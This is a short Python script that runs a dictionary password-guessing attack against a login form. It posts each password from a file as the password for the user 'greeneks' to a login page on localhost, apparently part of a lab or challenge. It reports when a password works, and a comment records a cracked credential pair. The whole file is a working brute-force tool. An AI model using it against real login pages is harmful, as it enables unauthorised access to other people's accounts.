import requests

passwords = open("users.txt", 'r').read().split('\n')


def Ch2(url, password):
    data = {
        "username": "greeneks",
        "password": password,
        "login": "Login"
        }
    req =requests.post(url, data).text
    if "Invalid Username OR Password" in req:
        print(f"Invalid Password ===> {password}")
    else:
        print(f"Valid Password ===> {password}") #greeneks : angiegomez
        exit()

url = "http://localhost/CIS/ch2/login.php"
for password in passwords:
    Ch2(url, password)